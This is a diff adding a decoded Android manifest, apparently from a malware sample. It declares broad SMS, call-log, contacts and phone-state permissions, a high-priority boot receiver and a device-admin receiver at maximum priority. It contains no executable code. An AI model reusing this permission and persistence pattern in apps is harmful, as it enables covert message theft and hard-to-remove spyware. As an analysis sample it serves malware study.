@@ -1,0 +1,86 @@
+manifest
+- package: vyaga.kdufad.kyakev
+- versionName: 4.20
+- versionCode: 1
+	uses-sdk
+	- minSdkVersion: 8
+	- targetSdkVersion: 19
+	uses-permission
+	- name: android.permission.RECEIVE_BOOT_COMPLETED
+	uses-permission
+	- name: android.permission.RECEIVE_SMS
+	uses-permission
+	- name: android.permission.WRITE_SMS
+	uses-permission
+	- name: android.permission.READ_SMS
+	permission
+	- name: android.permission.READ_SMS
+	uses-permission
+	- name: android.permission.SEND_SMS
+	uses-permission
+	- name: android.permission.INTERNET
+	uses-permission
+	- name: android.permission.ACCESS_WIFI_STATE
+	uses-permission
+	- name: android.permission.CHANGE_WIFI_STATE
+	uses-permission
+	- name: android.permission.WRITE_EXTERNAL_STORAGE
+	uses-permission
+	- name: android.permission.MOUNT_UNMOUNT_FILESYSTEMS
+	uses-permission
+	- name: android.permission.READ_PHONE_STATE
+	uses-permission
+	- name: android.permission.ADD_SYSTEM_SERVICE
+	uses-permission
+	- name: android.permission.READ_CONTACTS
+	uses-permission
+	- name: android.permission.ACCESS_NETWORK_STATE
+	uses-permission
+	- name: android.permission.READ_CALL_LOG
+	uses-permission
+	- name: android.permission.WRITE_CALL_LOG
+	uses-permission
+	- name: android.permission.CALL_PHONE
+	- required: false
+	uses-permission
+	- name: android.permission.BROADCAST_STICKY
+	- required: false
+	uses-permission
+	- name: android.permission.WAKE_LOCK
+	application
+	- icon: 2130837504
+	- name: com.aizd.entry.MainApp
+	- theme: 2131165185
+	- label: 2131099648
+	- allowBackup: true
+		activity
+		- name: com.aizd.entry.MainActivity
+		- label: 2131099648
+			intent-filter
+				action
+				- name: android.intent.action.MAIN
+				category
+				- name: android.intent.category.LAUNCHER
+		receiver
+		- name: com.admv3.listener.OnBootReceiver
+			intent-filter
+			- priority: 1000
+				action
+				- name: android.intent.action.BOOT_COMPLETED
+				category
+				- name: android.intent.category.LAUNCHER
+		receiver
+		- name: com.aizd.entry.LSecScreen
+		- permission: android.permission.BIND_DEVICE_ADMIN
+		- label: 2131099648
+			meta-data
+			- name: android.app.device_admin
+			- resource: 2130968576
+			intent-filter
+			- priority: 2147483647
+				action
+				- name: android.app.action.DEVICE_ADMIN_ENABLED
+		service
+		- name: com.admv.service.MainService
+		service
+		- name: com.admv.service.AdvService
